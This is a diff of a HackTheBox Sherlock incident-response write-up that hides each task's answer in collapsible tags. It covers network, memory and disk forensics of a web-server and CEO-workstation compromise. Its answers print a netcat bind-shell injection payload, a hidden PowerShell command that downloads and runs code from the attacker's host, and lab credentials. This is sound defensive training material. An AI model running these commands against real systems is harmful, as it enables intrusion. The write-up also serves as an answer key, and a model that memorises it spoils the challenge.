@@ -11,14 +11,18 @@ We neglected to prioritize the robust security of our network and servers, and a
 
 ![15a0abb3b96a1a555c45d45b72c7e615.png](/resources/15a0abb3b96a1a555c45d45b72c7e615-1.png)
 First, I filtered for http protocol then we can see which IP address is the webserver and which one is the attacker IP address
-```
-192.168.1.3
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>192.168.1.3</code></pre>
+</details>
 
 >Task 2: What is the IP address of the Attacker?
-```
-192.168.1.5
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>192.168.1.5</code></pre>
+</details>
 
 >Task 3: How many open ports were discovered by the attacker?
 
@@ -33,14 +37,18 @@ We will see that if we filtered for unique port, then we will found 15 ports tha
 
 ![e0c61568011d26bf9470d0485516f7cf.png](/resources/e0c61568011d26bf9470d0485516f7cf-1.png)
 If we go back to Wireshark and filter for each port then we can see that at first port 5555 sent RST, ACK back to the attacker and later it was used for reverse shell
-```
-14
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>14</code></pre>
+</details>
 
 >Task 4: What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?
-```
-25,53,80,110,119
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>25,53,80,110,119</code></pre>
+</details>
 
 >Task 5: The attacker exploited a misconfiguration allowing them to enumerate all subdomains. This misconfiguration is commonly referred to as (e.g, Unrestricted Access Controls)?
 
@@ -51,24 +59,30 @@ the attacker somehow sent DNS query to web server which was response back with a
 
 ![a630ab4560dcf3a2e417e214311c80b7.png](/resources/a630ab4560dcf3a2e417e214311c80b7-1.png)
 The exploited of this misconfiguration is called DNS Zone Transfer
-```
-DNS Zone Transfer
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>DNS Zone Transfer</code></pre>
+</details>
 
 >Task 6: How many subdomains were discovered by the attacker?
 
 ![fe919f290ef30624ed36dcebe9b490ea.png](/resources/fe919f290ef30624ed36dcebe9b490ea-1.png)
-```
-9
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>9</code></pre>
+</details>
 
 >Task 7: What is the compromised subdomain (e.g., dev.example.com) ?
 
 ![2d76b730658bd0947011ebb9abc3808b.png](/resources/2d76b730658bd0947011ebb9abc3808b-1.png)
 Later, the attacker tried to brute force login page on webserver which we can obtain subdomain here
-```
-sysmon.cs-corp.cd
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>sysmon.cs-corp.cd</code></pre>
+</details>
 
 >Task 8: What email address and password were used to log in (e.g., user@example.com:password123)?
 
@@ -79,9 +93,11 @@ So I used `(ip.addr == 192.168.1.5 && http) && (http.response.code == 302)` to l
 Here is credential in url decoded format
 ![c8213c359d6b20f5ccb1bc8678d29c22.png](/resources/c8213c359d6b20f5ccb1bc8678d29c22-1.png)
 We can obtain unformatted credential here and don't forget to add domain for admin user to answer this task
-```
-admin@cs-corp.cd:Pass@000_
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>admin@cs-corp.cd:Pass@000_</code></pre>
+</details>
 
 
 ![b5e500a4eb34ba38bb28860fc392bf70.png](/resources/b5e500a4eb34ba38bb28860fc392bf70-1.png)
@@ -95,18 +111,21 @@ And this is how web server responded back, look like we can bypass this to execu
 
 ![37f21fd9adc3343e7d8f8173d030e98a.png](/resources/37f21fd9adc3343e7d8f8173d030e98a-1.png)
 We know that an `/dashboard.php` can be abused to execute arbitrary command here and look like an attacker successfully executed to listen connection on port 5555 and its a bind shell (not reverse shell as we thought)
-```
-|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 &gt;/tmp/mypipe</code></pre>
+</details>
 
 >Task 10: What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?
 
 ![df83c953b4f991791a94e82a49c6bfcd.png](/resources/df83c953b4f991791a94e82a49c6bfcd-1.png)
 After the attacker connected to bind shell on port 5555, he used [pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) which is a local privilege escalation vulnerability on Linux
 
-```
-CVE-2021-4034
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>CVE-2021-4034</code></pre>
+</details>
 
 >Task 11: What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?
 
@@ -116,16 +135,20 @@ After successfully obtained root privilege, the attacker downloaded 3 files from
 The attacker tried to edit cronjob using nano but couldnt, so he replaced crontab file for persistence
 ![3a497bfa41b582736f839f15252b4ba6.png](/resources/3a497bfa41b582736f839f15252b4ba6-1.png)
 Created a cronjob is T1053.003 according to MITRE ATT&CK
-```
-T1053.003
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>T1053.003</code></pre>
+</details>
 
 >Task 12: The attacker tampered with the software hosted on the 'download' subdomain with the intent of gaining access to end-users. What is the Mitre ATT&CK technique ID for this attack?
 
 ![682ecc1caf83068c823e146e57fe0906.png](/resources/682ecc1caf83068c823e146e57fe0906-1.png)
-```
-T1195.002
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>T1195.002</code></pre>
+</details>
 
 >Task 13: What command provided persistence in the cs-linux.deb file?
 
@@ -158,27 +181,31 @@ I asked ChatGPT to write a script to decode it without directly executed base64 
 ![bc20d76e7528d13315f7f4e455f3fce5.png](/resources/bc20d76e7528d13315f7f4e455f3fce5-1.png)
 Then we will have this decoded python script that will create a connection to the attacker IP address on port 4444 for persistence
 
-```
-echo cs-linux && >> ~/.bashrc
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>echo cs-linux &amp;&amp; &gt;&gt; ~/.bashrc</code></pre>
+</details>
 
 >Task 14: The attacker sent emails to employees, what the name for the running process that allowed this to occur?
 
 ![f01ccfb90f06a491d2a2f0887741b31e.png](/resources/f01ccfb90f06a491d2a2f0887741b31e-1.png)
 After moved provided ubuntu profile to plugin/overlays/linux then we can use `linux_pstree` plugin to list all process in tree then we can see that citserver is the one we're looking for
 ![c2e1b59fc7b4ae7d44b43cb64c65098c.png](/resources/c2e1b59fc7b4ae7d44b43cb64c65098c-1.png)
-```
-citserver
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>citserver</code></pre>
+</details>
 
 >Task 15: We received phishing email can you provide subject of email ?
 
 ![ce50aa1716e775c6af611ac12e1de807.png](/resources/ce50aa1716e775c6af611ac12e1de807-1.png)
 I tried to find any log related to mail and citadel but didn't find anything so the only way I could think of was to used `strings Memory_WebServer.mem | grep "Subject:"` to display email header that was embbed in this memory file directly and look like it worked
 
-```
-Review Revised Privacy Policy
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Review Revised Privacy Policy</code></pre>
+</details>
 
 >Task 16: What is the name of the malicious attachment?
 
@@ -186,41 +213,49 @@ Review Revised Privacy Policy
 ![4ca636dfb4fc1a574184f881f871b2da.png](/resources/4ca636dfb4fc1a574184f881f871b2da-1.png)
 I used Jumplist that found on `C:\Users\ceo-us\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations` to find this answer, we can see that `policy.docm` is the suspicious macro document file and it is what we're looking for
 
-```
-policy.docm
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>policy.docm</code></pre>
+</details>
 
 >Task 17: Please identify the usernames of the CEOs who received the attachment.
 
 ![fd8693d7278fd5e2ed63d5b154f0ad57.png](/resources/fd8693d7278fd5e2ed63d5b154f0ad57-1.png)
 I used `strings Memory_WebServer.mem | grep "Return-Path"`, we only got 1 username but we have ceo-us user folder in disk file collected with KAPE so it has to be ceo-ru and us
 
-```
-ceo-ru, ceo-us
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>ceo-ru, ceo-us</code></pre>
+</details>
 
 >Task 18: What is the hostname for the compromised CEO?
 
 ![f2d58e1e550431e4ef415988ec039b2b.png](/resources/f2d58e1e550431e4ef415988ec039b2b-1.png)
 I queried this registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters` to obtain a hostname of this machine that has ceo-us as one of users
-```
-DESKTOP-ELS5JAK
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>DESKTOP-ELS5JAK</code></pre>
+</details>
 
 >Task 19: What is the full path for the malicious attachment?
 
 ![4ca636dfb4fc1a574184f881f871b2da.png](/resources/4ca636dfb4fc1a574184f881f871b2da-1.png)
-```
-C:\Users\ceo-us\Downloads\policy.docm
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Users\ceo-us\Downloads\policy.docm</code></pre>
+</details>
 
 >Task 20: Can you provide the command used to gain initial access?
 
 ![d53f8b2efb9f0f621b891b8087c7bd37.png](/resources/d53f8b2efb9f0f621b891b8087c7bd37-1.png)
 I found this command on PowerShell event log which later will be answered what kind of threat is this file
-```
-powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))</code></pre>
+</details>
 
 >Task 21: Provide a Popular threat label for the malicious executable used to gain initial access?
 
@@ -242,17 +277,21 @@ To obtain the right answer, we need to go to Dropped Files and we can see there 
 
 ![b7f8b22d87c8ad2b2689c88af355429b.png](/resources/b7f8b22d87c8ad2b2689c88af355429b-1.png)
 It is the one, we're looking for which is a cobalt strike beacon
-```
-trojan.cobaltstrike/beacon
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>trojan.cobaltstrike/beacon</code></pre>
+</details>
 
 >Task 22: What is the payload type?
 
 ![40329c2a6b3bfbec71ca57446ea78279.png](/resources/40329c2a6b3bfbec71ca57446ea78279-1.png)
 I used an file that the attacker uploaded to web server with [1768.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) to obtained this answer > `python3 1768.py cs-windows.exe`
-```
-windows-beacon_http-reverse_http
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>windows-beacon_http-reverse_http</code></pre>
+</details>
 
 >Task 23: What is task name has been add by attacker?
 
@@ -260,9 +299,11 @@ windows-beacon_http-reverse_http
 I went to Schedule task folder and there is 1 task that was modified when an incident occurs
 ![effbb81da48c45cd5ef045e124bbb36f.png](/resources/effbb81da48c45cd5ef045e124bbb36f-1.png)
 And look like this is the one
-```
-WindowsUpdateCheck
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>WindowsUpdateCheck</code></pre>
+</details>
 
 ![6cfaf193d0089ef8ad35aadb27dbf868.png](/resources/6cfaf193d0089ef8ad35aadb27dbf868.png)
 https://labs.hackthebox.com/achievement/sherlock/1438364/612
